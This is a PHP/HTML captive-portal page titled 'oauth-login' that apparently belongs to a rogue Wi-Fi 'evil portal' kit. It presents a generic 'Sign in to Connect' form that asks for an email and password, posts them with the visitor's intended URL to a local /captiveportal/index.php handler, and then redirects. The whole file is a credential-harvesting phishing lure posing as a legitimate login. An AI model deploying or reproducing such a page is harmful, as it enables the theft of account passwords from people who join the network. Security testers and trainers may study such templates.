<?php
$destination = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['HTTP_URI'] . "";
require_once('helper.php');
?>

  <HTML>

  <HEAD>
    <title>oauth-login</title>
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Expires" content="0" />
    <script type="text/javascript">
      function redirect() {
        setTimeout(function() {
          window.location = "/captiveportal/index.php";
        }, 100);
      }
    </script>
    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/style.css">
    <script src="assets/js/jquery-2.2.1.min.js"></script>
  </HEAD>

  <BODY>
      <div class="container">
            <h1 class="text-center login-title">Sign in to Connect</h1>
            <div class="account-wall">
              <img class="profile-img" src="assets/img/photo.png" alt="">
              <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" class="form-signin">
                <input type="hidden" name="target" value="<?=$destination?>">
                <input type="text" name="email" class="form-control" placeholder="Email" required autofocus>
                <input type="password" name="pass" class="form-control" placeholder="Password" required><br>
                <button class="btn btn-primary btn-block" name="login" type="submit">
                  Sign in</button>
                <a href="#" class="pull-right need-help">Find my account </a><span class="clearfix"></span>
              </form>
            </div>
            <br><a href="#" class="text-center new-account">Create an account </a>
      </div>
  </BODY>

  </HTML>
